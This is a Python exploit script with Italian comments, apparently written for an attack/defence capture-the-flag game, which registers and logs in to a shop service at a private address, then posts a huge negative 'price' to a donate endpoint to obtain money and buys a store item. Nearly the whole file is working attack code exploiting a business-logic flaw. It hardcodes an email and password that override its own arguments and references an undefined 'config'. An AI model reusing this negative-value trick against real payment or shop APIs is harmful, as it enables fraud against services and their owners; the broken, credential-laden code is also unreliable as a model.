import requests

def register_user(username: str, email: str, password: str):
    try:
        url = f"http://10.60.13.1/api/register"
        payload = {
            "username": "flaviu",
            "email": "09fla40xd@gmail.com",
            "password": "12345678"
        }
        headers = {
            "Content-Type": "application/json"
        }

        response = requests.post(url, json=payload, headers=headers, verify=False)

        if response.status_code == 201:
            print("Registrazione avvenuta con successo!")
            return True
        elif response.status_code == 409:
            print("Utente già esistente. Procedo con il login.")
            return "EXISTS"  # Restituisci un segnale che l'utente esiste
        else:
            print(f"Errore durante la registrazione: {response.status_code}, {response.text}")
            return False
    except Exception as e:
        print(f"Errore durante la registrazione: {str(e)}")
        return False

def login_user(username: str, password: str):
    try:
        url = f"http://10.60.13.1/api/login"
        payload = {
            "email": "09fla40xd@gmail.com",
            "password": "12345678"
        }
        headers = {
            "Content-Type": "application/json"
        }

        response = requests.post(url, json=payload, headers=headers, verify=False)

        if response.status_code == 200:
            session_token = response.cookies.get('session')  # Ottieni il cookie di sessione
            print(f"Login avvenuto con successo! Token di sessione: {session_token}")
            return session_token
        else:
            print(f"Errore durante il login: {response.status_code}, {response.text}")
            return None
    except Exception as e:
        print(f"Errore durante il login: {str(e)}")
        return None

def exploit_donate(session_token: str, flag_id: str):
    try:
        url = f"http://10.60.13.1/api/donate"
        payload = {
            "price": -10000000000,  # Exploit del valore negativo
            "username": flag_id
        }
        headers = {
            "Authorization": f"Bearer {config.team_token}",
            "Content-Type": "application/json",
            "Cookie": f"session={session_token}",  # Usa il cookie di sessione per autenticarti
            "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36"
        }

        response = requests.post(url, json=payload, headers=headers, verify=False)

        if response.status_code == 200:
            print("Exploit eseguito con successo! Soldi ottenuti!")
            return True
        else:
            print(f"Errore durante l'exploit: {response.status_code}")
            return False
    except Exception as e:
        print(f"Errore durante l'exploit: {str(e)}")
        return False

def buy_item(session_token: str, item_id: int):
    try:
        url = f"http://10.60.13.1/api/store/1/buy"
        
        headers = {
            "Content-Type": "application/json",
            "Cookie": f"session={session_token}",  # Usa il cookie di sessione per autenticarti
            "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36"
        }

        response = requests.post(url, headers=headers, verify=False)

        if response.status_code == 200:
            print(f"Articolo {item_id} acquistato con successo!")
            return requests.get(url, headers=headers, verify=False)
        else:
            print(f"Errore durante l'acquisto dell'articolo: {response.status_code}")
            return False
    except Exception as e:
        print(f"Errore durante l'acquisto: {str(e)}")
        return False

def main():
    # Dettagli utente
    username = "attacker"
    email = "attacker@example.com"
    password = "password123"
    
    # 1. Registrazione
    registration_result = register_user(username, email, password)
    if registration_result == True:
        print("Utente registrato e pronto.")
    elif registration_result == "EXISTS":
        print("Utente esistente, eseguo il login.")
    
    # 2. Login
    session_token = login_user(username, password)
    if session_token:
        # 3. Exploit (ottenere soldi)
        flag_id = "flag123"  # Cambia con il flag corretto
        if exploit_donate(session_token, flag_id):
            # 4. Acquisto di un articolo
            item_id = 1  # Cambia con l'ID dell'articolo che vuoi comprare
            buy_item(session_token, item_id,)

if __name__ == "__main__":
    main()